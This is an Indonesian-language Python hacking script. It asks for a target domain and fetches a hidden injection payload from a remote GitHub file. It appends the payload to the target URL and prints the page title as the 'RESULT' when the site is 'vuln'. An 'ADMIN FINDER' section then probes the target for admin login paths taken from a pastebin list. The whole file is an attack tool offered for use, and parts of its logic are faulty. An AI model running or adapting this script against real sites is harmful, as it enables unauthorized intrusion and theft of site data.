import os
from requests import get
from bs4 import BeautifulSoup

def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

clear()
asci = get("https://raw.githubusercontent.com/archive-code/gapenting/master/1.txt")
ascii = BeautifulSoup(asci.text, 'html.parser')
print (ascii)
l1 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/2.txt")
l2 = BeautifulSoup(l1.text, 'html.parser')
print (l2)
uDOMEN = input('Masukkan Domain Target: ')
p1 = get("https://raw.githubusercontent.com/archive-code/gapenting/master/3.txt")
p2 = BeautifulSoup(p1.text, 'html.parser')
p3 = p2.text
urla = get("http://"+uDOMEN+p3)
soup = BeautifulSoup(urla.text, 'html.parser')
hasil = soup.find('title')
try:
  res = hasil.text.rstrip().lstrip()
  print("RESULT = ")
  ress = res.replace(",,", "\n")
  print(ress.replace(",","|"))
except:
  print('Situs Not Vuln Pak :(')
  exit

print ("""
==============================================================
ADMIN FINDER
LIST DIBAWAH JIKA TIDAK MAUNAMBAH DI ENTER LANGSUNGAJA
""")
urls = uDOMEN                  
if 'http' not in urls:
    urls = 'http://'+urls
listadmin = input("Masukkan list tambahan:")
print ("==============================================================")
listone1 = get("https://pastebin.com/raw/Vkqv0FJy") 
listone2 = BeautifulSoup(listone1.text, 'html.parser')
listone = listone2.text
adminList = [listone,listadmin]
for admin in adminList:
    try:
        urli = urls+'/'+admin
        urlr = get(urli)

    except:                                                   
         print("gk ad url")                                         
         exit()
    if urlr.status_code == 200:
        print(admin)
        print(urli)
    else:
        print('tidak ada |',urli)
